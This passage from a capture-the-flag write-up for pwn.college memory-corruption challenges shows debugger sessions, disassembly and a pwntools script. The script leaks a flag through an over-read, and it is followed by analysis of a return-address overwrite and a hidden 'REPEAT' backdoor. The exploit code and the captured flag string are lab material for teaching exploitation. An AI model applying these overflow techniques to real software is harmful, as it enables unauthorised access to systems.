0x0000000000001289  bin_padding
0x00000000000016bb  challenge
0x0000000000001845  main
0x0000000000001950  __libc_csu_init
0x00000000000019c0  __libc_csu_fini
0x00000000000019c8  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000000016bb <+0>:     endbr64
   0x00000000000016bf <+4>:     push   rbp
   0x00000000000016c0 <+5>:     mov    rbp,rsp
   0x00000000000016c3 <+8>:     sub    rsp,0x1b0
   0x00000000000016ca <+15>:    mov    DWORD PTR [rbp-0x194],edi
   0x00000000000016d0 <+21>:    mov    QWORD PTR [rbp-0x1a0],rsi
   0x00000000000016d7 <+28>:    mov    QWORD PTR [rbp-0x1a8],rdx
   0x00000000000016de <+35>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000016e7 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000016eb <+48>:    xor    eax,eax
   0x00000000000016ed <+50>:    lea    rdx,[rbp-0x170]
   0x00000000000016f4 <+57>:    mov    eax,0x0
   0x00000000000016f9 <+62>:    mov    ecx,0x2b
   0x00000000000016fe <+67>:    mov    rdi,rdx
   0x0000000000001701 <+70>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000001704 <+73>:    mov    rdx,rdi
   0x0000000000001707 <+76>:    mov    DWORD PTR [rdx],eax
   0x0000000000001709 <+78>:    add    rdx,0x4
   0x000000000000170d <+82>:    lea    rax,[rbp-0x170]
   0x0000000000001714 <+89>:    mov    QWORD PTR [rbp-0x180],rax
   0x000000000000171b <+96>:    lea    rax,[rbp-0x170]
   0x0000000000001722 <+103>:   add    rax,0x5c
   0x0000000000001726 <+107>:   mov    QWORD PTR [rbp-0x178],rax
   0x000000000000172d <+114>:   mov    QWORD PTR [rbp-0x188],0x0
   0x0000000000001738 <+125>:   mov    esi,0x0
   0x000000000000173d <+130>:   lea    rdi,[rip+0x8c4]        # 0x2008
   0x0000000000001744 <+137>:   mov    eax,0x0
   0x0000000000001749 <+142>:   call   0x1160 <open@plt>
   0x000000000000174e <+147>:   mov    ecx,eax
   0x0000000000001750 <+149>:   mov    rax,QWORD PTR [rbp-0x178]
   0x0000000000001757 <+156>:   mov    edx,0x100
   0x000000000000175c <+161>:   mov    rsi,rax
   0x000000000000175f <+164>:   mov    edi,ecx
   0x0000000000001761 <+166>:   call   0x1140 <read@plt>
   0x0000000000001766 <+171>:   lea    rdi,[rip+0x8a1]        # 0x200e
   0x000000000000176d <+178>:   mov    eax,0x0
   0x0000000000001772 <+183>:   call   0x1130 <printf@plt>
   0x0000000000001777 <+188>:   lea    rax,[rbp-0x188]
   0x000000000000177e <+195>:   mov    rsi,rax
   0x0000000000001781 <+198>:   lea    rdi,[rip+0x895]        # 0x201d
   0x0000000000001788 <+205>:   mov    eax,0x0
   0x000000000000178d <+210>:   call   0x1170 <__isoc99_scanf@plt>
   0x0000000000001792 <+215>:   mov    rax,QWORD PTR [rbp-0x188]
   0x0000000000001799 <+222>:   mov    rsi,rax
   0x000000000000179c <+225>:   lea    rdi,[rip+0x885]        # 0x2028
   0x00000000000017a3 <+232>:   mov    eax,0x0
   0x00000000000017a8 <+237>:   call   0x1130 <printf@plt>
   0x00000000000017ad <+242>:   mov    rdx,QWORD PTR [rbp-0x188]
   0x00000000000017b4 <+249>:   mov    rax,QWORD PTR [rbp-0x180]
   0x00000000000017bb <+256>:   mov    rsi,rax
   0x00000000000017be <+259>:   mov    edi,0x0
   0x00000000000017c3 <+264>:   call   0x1140 <read@plt>
   0x00000000000017c8 <+269>:   mov    DWORD PTR [rbp-0x18c],eax
   0x00000000000017ce <+275>:   cmp    DWORD PTR [rbp-0x18c],0x0
   0x00000000000017d5 <+282>:   jns    0x1803 <challenge+328>
   0x00000000000017d7 <+284>:   call   0x1100 <__errno_location@plt>
   0x00000000000017dc <+289>:   mov    eax,DWORD PTR [rax]
   0x00000000000017de <+291>:   mov    edi,eax
   0x00000000000017e0 <+293>:   call   0x1190 <strerror@plt>
   0x00000000000017e5 <+298>:   mov    rsi,rax
   0x00000000000017e8 <+301>:   lea    rdi,[rip+0x861]        # 0x2050
   0x00000000000017ef <+308>:   mov    eax,0x0
   0x00000000000017f4 <+313>:   call   0x1130 <printf@plt>
   0x00000000000017f9 <+318>:   mov    edi,0x1
   0x00000000000017fe <+323>:   call   0x1180 <exit@plt>
   0x0000000000001803 <+328>:   mov    rax,QWORD PTR [rbp-0x180]
   0x000000000000180a <+335>:   mov    rsi,rax
   0x000000000000180d <+338>:   lea    rdi,[rip+0x860]        # 0x2074
   0x0000000000001814 <+345>:   mov    eax,0x0
   0x0000000000001819 <+350>:   call   0x1130 <printf@plt>
   0x000000000000181e <+355>:   lea    rdi,[rip+0x85d]        # 0x2082
   0x0000000000001825 <+362>:   call   0x1110 <puts@plt>
   0x000000000000182a <+367>:   mov    eax,0x0
   0x000000000000182f <+372>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001833 <+376>:   xor    rcx,QWORD PTR fs:0x28
   0x000000000000183c <+385>:   je     0x1843 <challenge+392>
   0x000000000000183e <+387>:   call   0x1120 <__stack_chk_fail@plt>
   0x0000000000001843 <+392>:   leave
   0x0000000000001844 <+393>:   ret
End of assembler dump.
```

Let's set breakpoints at both the calls to `read@plt` in order to get the required information.

```
pwndbg> break *(challenge+166)
Breakpoint 1 at 0x1761
```

```
pwndbg> break *(challenge+264)
Breakpoint 2 at 0x17c3
```

Let's run.

```
pwndbg> run
Starting program: /challenge/nosy-neighbor-hard 
###
### Welcome to /challenge/nosy-neighbor-hard!
###


Breakpoint 1, 0x000062579b759761 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd4aea25dc ◂— 0
 RBX  0x62579b759950 (__libc_csu_init) ◂— endbr64 
 RCX  0xffffffff
 RDX  0x100
 RDI  0xffffffff
 RSI  0x7ffd4aea25dc ◂— 0
 R8   0xa
 R9   0x2e
 R10  0
 R11  0x246
 R12  0x62579b7591a0 (_start) ◂— endbr64 
 R13  0x7ffd4aea3820 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd4aea26f0 —▸ 0x7ffd4aea3730 ◂— 0
 RSP  0x7ffd4aea2540 ◂— 0
 RIP  0x62579b759761 (challenge+166) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x62579b759761 <challenge+166>    call   read@plt                    <read@plt>
        fd: 0xffffffff
        buf: 0x7ffd4aea25dc ◂— 0
        nbytes: 0x100
 
   0x62579b759766 <challenge+171>    lea    rdi, [rip + 0x8a1]     RDI => 0x62579b75a00e ◂— 'Payload size: '
   0x62579b75976d <challenge+178>    mov    eax, 0                 EAX => 0
   0x62579b759772 <challenge+183>    call   printf@plt                  <printf@plt>
 
   0x62579b759777 <challenge+188>    lea    rax, [rbp - 0x188]
   0x62579b75977e <challenge+195>    mov    rsi, rax
   0x62579b759781 <challenge+198>    lea    rdi, [rip + 0x895]     RDI => 0x62579b75a01d ◂— 0x756c25 /* '%lu' */
   0x62579b759788 <challenge+205>    mov    eax, 0                 EAX => 0
   0x62579b75978d <challenge+210>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
 
   0x62579b759792 <challenge+215>    mov    rax, qword ptr [rbp - 0x188]
   0x62579b759799 <challenge+222>    mov    rsi, rax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd4aea2540 ◂— 0
01:0008│-1a8 0x7ffd4aea2548 —▸ 0x7ffd4aea3838 —▸ 0x7ffd4aea5698 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-1a0 0x7ffd4aea2550 —▸ 0x7ffd4aea3828 —▸ 0x7ffd4aea567a ◂— '/challenge/nosy-neighbor-hard'
03:0018│-198 0x7ffd4aea2558 ◂— 0x100000000
04:0020│-190 0x7ffd4aea2560 ◂— 0
05:0028│-188 0x7ffd4aea2568 ◂— 0
06:0030│-180 0x7ffd4aea2570 —▸ 0x7ffd4aea2580 ◂— 0
07:0038│-178 0x7ffd4aea2578 —▸ 0x7ffd4aea25dc ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x62579b759761 challenge+166
   1   0x62579b75991a main+213
   2   0x75752919b083 __libc_start_main+243
   3   0x62579b7591ce _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Location of buffer
- [x] Location of flag: `0x7ffd4aea25dc`

```
pwndbg> c
Continuing.
Payload size: 10
Send your payload (up to 10 bytes)!

Breakpoint 2, 0x000062579b7597c3 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
*RAX  0x7ffd4aea2580 ◂— 0
 RBX  0x62579b759950 (__libc_csu_init) ◂— endbr64 
*RCX  0
*RDX  0xa
*RDI  0
*RSI  0x7ffd4aea2580 ◂— 0
*R8   0x24
*R9   0x24
*R10  0x62579b75a044 ◂— ' bytes)!\n'
 R11  0x246
 R12  0x62579b7591a0 (_start) ◂— endbr64 
 R13  0x7ffd4aea3820 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd4aea26f0 —▸ 0x7ffd4aea3730 ◂— 0
 RSP  0x7ffd4aea2540 ◂— 0
*RIP  0x62579b7597c3 (challenge+264) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x62579b7597c3 <challenge+264>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffd4aea2580 ◂— 0
        nbytes: 0xa
 
   0x62579b7597c8 <challenge+269>    mov    dword ptr [rbp - 0x18c], eax
   0x62579b7597ce <challenge+275>    cmp    dword ptr [rbp - 0x18c], 0
   0x62579b7597d5 <challenge+282>    jns    challenge+328               <challenge+328>
 
   0x62579b7597d7 <challenge+284>    call   __errno_location@plt        <__errno_location@plt>
 
   0x62579b7597dc <challenge+289>    mov    eax, dword ptr [rax]
   0x62579b7597de <challenge+291>    mov    edi, eax
   0x62579b7597e0 <challenge+293>    call   strerror@plt                <strerror@plt>
 
   0x62579b7597e5 <challenge+298>    mov    rsi, rax
   0x62579b7597e8 <challenge+301>    lea    rdi, [rip + 0x861]     RDI => 0x62579b75a050 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x62579b7597ef <challenge+308>    mov    eax, 0                 EAX => 0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd4aea2540 ◂— 0
01:0008│-1a8 0x7ffd4aea2548 —▸ 0x7ffd4aea3838 —▸ 0x7ffd4aea5698 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-1a0 0x7ffd4aea2550 —▸ 0x7ffd4aea3828 —▸ 0x7ffd4aea567a ◂— '/challenge/nosy-neighbor-hard'
03:0018│-198 0x7ffd4aea2558 ◂— 0x100000000
04:0020│-190 0x7ffd4aea2560 ◂— 0
05:0028│-188 0x7ffd4aea2568 ◂— 0xa /* '\n' */
06:0030│-180 0x7ffd4aea2570 —▸ 0x7ffd4aea2580 ◂— 0
07:0038│-178 0x7ffd4aea2578 —▸ 0x7ffd4aea25dc ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x62579b7597c3 challenge+264
   1   0x62579b75991a main+213
   2   0x75752919b083 __libc_start_main+243
   3   0x62579b7591ce _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffd4aea2580`
- [x] Location of flag: `0x7ffd4aea25dc`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/nosy-neighbor-hard')

# Initialize values
buffer_addr = 0x7ffd4aea2580
flag_addr = 0x7ffd4aea25dc

# Calculate offset & payload_size
offset = flag_addr - buffer_addr
payload_size = offset

# Build payload
payload = b"A" * offset

# Send payload size
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size).encode())

# Send payload
p.recvuntil(b'bytes)!')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~nosy-neighbor-hard:/$ python ~/script.py 
[+] Starting local process '/challenge/nosy-neighbor-hard': pid 1970
[*] Switching to interactive mode

[*] Process '/challenge/nosy-neighbor-hard' stopped with exit code 0 (pid 1970)
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{seHXRAHm8puywEDXYRQy1e9CkQK.0FOwMDL4ITM0EzW}

Goodbye!
### Goodbye!
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Recursive Ruin (Easy)

```
hacker@program-security~recursive-ruin-easy:/$ /challenge/recursive-ruin-easy 
###
### Welcome to /challenge/recursive-ruin-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffdd3f89e70 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffdd3f89e78 (rsp+0x0008) | 68 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b068 |
| 0x00007ffdd3f89e80 (rsp+0x0010) | 58 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b058 |
| 0x00007ffdd3f89e88 (rsp+0x0018) | 23 97 02 14 01 00 00 00 | 0x0000000114029723 |
| 0x00007ffdd3f89e90 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffdd3f89e98 (rsp+0x0028) | 51 c9 ec 13 8d 75 00 00 | 0x0000758d13ecc951 |
| 0x00007ffdd3f89ea0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ea8 (rsp+0x0038) | b0 9e f8 d3 fd 7f 00 00 | 0x00007ffdd3f89eb0 |
| 0x00007ffdd3f89eb0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89eb8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ec0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ec8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ed0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ed8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ee0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ee8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ef0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ef8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89f00 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89f08 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89f10 (rsp+0x00a0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
| 0x00007ffdd3f89f18 (rsp+0x00a8) | 00 06 c1 f9 c2 9d 7b 1d | 0x1d7b9dc2f9c10600 |
| 0x00007ffdd3f89f20 (rsp+0x00b0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
| 0x00007ffdd3f89f28 (rsp+0x00b8) | c5 26 29 98 fb 58 00 00 | 0x000058fb982926c5 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffdd3f89e70, and our base pointer points to 0x7ffdd3f89f20.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffdd3f89eb0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 95 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffdd3f89f28, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (95 to fill the buffer,
25 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Because the binary is position independent, you cannot know
exactly where the win_authed() function is located.
This means that it is not clear what should be written into the return address.

Payload size: 2
You have chosen to send 2 bytes of input!
This will allow you to write from 0x7ffdd3f89eb0 (the start of the input buffer)
right up to (but not including) 0x7ffdd3f89eb2 (which is -93 bytes beyond the end of the buffer).
Of these, you will overwrite -118 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
This is okay: we can just run our exploit a few times until it works
(statistically, ~50% chance after 11 times and ~90% chance after 36 times).
One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7ffdd3f89f28, 120 bytes into the buffer)
with the correct value.

Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffdd3f89e70 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffdd3f89e78 (rsp+0x0008) | 68 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b068 |
| 0x00007ffdd3f89e80 (rsp+0x0010) | 58 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b058 |
| 0x00007ffdd3f89e88 (rsp+0x0018) | 23 97 02 14 01 00 00 00 | 0x0000000114029723 |
| 0x00007ffdd3f89e90 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffdd3f89e98 (rsp+0x0028) | 51 c9 ec 13 02 00 00 00 | 0x0000000213ecc951 |
| 0x00007ffdd3f89ea0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
| 0x00007ffdd3f89ea8 (rsp+0x0038) | b0 9e f8 d3 fd 7f 00 00 | 0x00007ffdd3f89eb0 |
| 0x00007ffdd3f89eb0 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007ffdd3f89eb8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ec0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ec8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ed0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ed8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ee0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ee8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ef0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89ef8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89f00 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89f08 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdd3f89f10 (rsp+0x00a0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
| 0x00007ffdd3f89f18 (rsp+0x00a8) | 00 06 c1 f9 c2 9d 7b 1d | 0x1d7b9dc2f9c10600 |
| 0x00007ffdd3f89f20 (rsp+0x00b0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
| 0x00007ffdd3f89f28 (rsp+0x00b8) | c5 26 29 98 fb 58 00 00 | 0x000058fb982926c5 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffdd3f89eb0
- the saved frame pointer (of main) is at 0x7ffdd3f89f20
- the saved return address (previously to main) is at 0x7ffdd3f89f28
- the saved return address is now pointing to 0x58fb982926c5.
- the canary is stored at 0x7ffdd3f89f18.
- the canary value is now 0x1d7b9dc2f9c10600.
- the address of win_authed() is 0x58fb98291cc1.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

You said: aa
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!
Goodbye!
### Goodbye!
```

The challegne hints that there is a trick after the `puts()` call to print the hint is made.

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001110  __cxa_finalize@plt
0x0000000000001120  putchar@plt
0x0000000000001130  __errno_location@plt
0x0000000000001140  puts@plt
0x0000000000001150  write@plt
0x0000000000001160  __stack_chk_fail@plt
0x0000000000001170  printf@plt
0x0000000000001180  geteuid@plt
0x0000000000001190  read@plt
0x00000000000011a0  setvbuf@plt
0x00000000000011b0  open@plt
0x00000000000011c0  __isoc99_scanf@plt
0x00000000000011d0  exit@plt
0x00000000000011e0  strerror@plt
0x00000000000011f0  strstr@plt
0x0000000000001200  _start
0x0000000000001230  deregister_tm_clones
0x0000000000001260  register_tm_clones
0x00000000000012a0  __do_global_dtors_aux
0x00000000000012e0  frame_dummy
0x00000000000012e9  DUMP_STACK
0x00000000000014ec  bin_padding
0x0000000000001cc1  win_authed
0x0000000000001dde  challenge
0x00000000000025f0  main
0x00000000000026f0  __libc_csu_init
0x0000000000002760  __libc_csu_fini
0x0000000000002768  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x000000000000236a <+1420>:  mov    rdx,QWORD PTR [rbp-0x80]
   0x000000000000236e <+1424>:  mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000002372 <+1428>:  mov    rsi,rax
   0x0000000000002375 <+1431>:  mov    edi,0x0
   0x000000000000237a <+1436>:  call   0x1190 <read@plt>

# ---- snip ----   

   0x0000000000002580 <+1954>:  call   0x1140 <puts@plt>
   0x0000000000002585 <+1959>:  mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000002589 <+1963>:  lea    rsi,[rip+0x2001]        # 0x4591
   0x0000000000002590 <+1970>:  mov    rdi,rax
   0x0000000000002593 <+1973>:  call   0x11f0 <strstr@plt>
   0x0000000000002598 <+1978>:  test   rax,rax
   0x000000000000259b <+1981>:  je     0x25c9 <challenge+2027>
   0x000000000000259d <+1983>:  lea    rdi,[rip+0x1ff4]        # 0x4598
   0x00000000000025a4 <+1990>:  call   0x1140 <puts@plt>
   0x00000000000025a9 <+1995>:  mov    rdx,QWORD PTR [rbp-0xa8]
   0x00000000000025b0 <+2002>:  mov    rcx,QWORD PTR [rbp-0xa0]
   0x00000000000025b7 <+2009>:  mov    eax,DWORD PTR [rbp-0x94]
   0x00000000000025bd <+2015>:  mov    rsi,rcx
   0x00000000000025c0 <+2018>:  mov    edi,eax
   0x00000000000025c2 <+2020>:  call   0x1dde <challenge>
   0x00000000000025c7 <+2025>:  jmp    0x25da <challenge+2044>
   0x00000000000025c9 <+2027>:  lea    rdi,[rip+0x1ff2]        # 0x45c2
   0x00000000000025d0 <+2034>:  call   0x1140 <puts@plt>
   0x00000000000025d5 <+2039>:  mov    eax,0x0
   0x00000000000025da <+2044>:  mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000000025de <+2048>:  xor    rcx,QWORD PTR fs:0x28
   0x00000000000025e7 <+2057>:  je     0x25ee <challenge+2064>
   0x00000000000025e9 <+2059>:  call   0x1160 <__stack_chk_fail@plt>
   0x00000000000025ee <+2064>:  leave
   0x00000000000025ef <+2065>:  ret
End of assembler dump.
```

The challenge calls `strstr@plt` in order to find a substring `needle` within the string `haystack`. The string address is stored at `rbp-0x80` which is where our buffer is stored as well.
So it looks for some substring within our string.

Then if it finds the substring, it calls itself again at `challenge+2020`. Otherwise it exits.

Let's see what substring it expects, because if we successfully pass it, we will get the canary value and also another chance to send the actual payload.

```
pwndbg> break *(challenge+1973)
Breakpoint 1 at 0x2593
```

```
pwndbg> run
Starting program: /challenge/recursive-ruin-easy 

# ---- snip ----

Payload size: 2

# ---- snip ----

Send your payload (up to 2 bytes)!
aa

# ---- snip ----

You said: aa
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!

Breakpoint 1, 0x000060963a011593 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
 RBX  0x60963a0116f0 (__libc_csu_init) ◂— endbr64 
 RCX  0x71f57eda4297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
 RSI  0x60963a013591 ◂— 0x4200544145504552 /* 'REPEAT' */
 R8   0x21
 R9   0xd
 R10  0x60963a013503 ◂— 0x696854000000000a /* '\n' */
 R11  0x246
 R12  0x60963a010200 (_start) ◂— endbr64 
 R13  0x7ffc8036c760 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc8036b630 —▸ 0x7ffc8036c670 ◂— 0
 RSP  0x7ffc8036b580 ◂— 0x1be6a0
 RIP  0x60963a011593 (challenge+1973) ◂— call strstr@plt
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x60963a011593 <challenge+1973>    call   strstr@plt                  <strstr@plt>
        haystack: 0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
        needle: 0x60963a013591 ◂— 0x4200544145504552 /* 'REPEAT' */
 
   0x60963a011598 <challenge+1978>    test   rax, rax
   0x60963a01159b <challenge+1981>    je     challenge+2027              <challenge+2027>
 
   0x60963a01159d <challenge+1983>    lea    rdi, [rip + 0x1ff4]     RDI => 0x60963a013598 ◂— 'Backdoor triggered! Repeating challenge()'
   0x60963a0115a4 <challenge+1990>    call   puts@plt                    <puts@plt>
 
   0x60963a0115a9 <challenge+1995>    mov    rdx, qword ptr [rbp - 0xa8]
   0x60963a0115b0 <challenge+2002>    mov    rcx, qword ptr [rbp - 0xa0]
   0x60963a0115b7 <challenge+2009>    mov    eax, dword ptr [rbp - 0x94]
   0x60963a0115bd <challenge+2015>    mov    rsi, rcx
   0x60963a0115c0 <challenge+2018>    mov    edi, eax
   0x60963a0115c2 <challenge+2020>    call   challenge                   <challenge>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc8036b580 ◂— 0x1be6a0
01:0008│-0a8 0x7ffc8036b588 —▸ 0x7ffc8036c778 —▸ 0x7ffc8036e696 ◂— 'SHELL=/run/dojo/bin/bash'
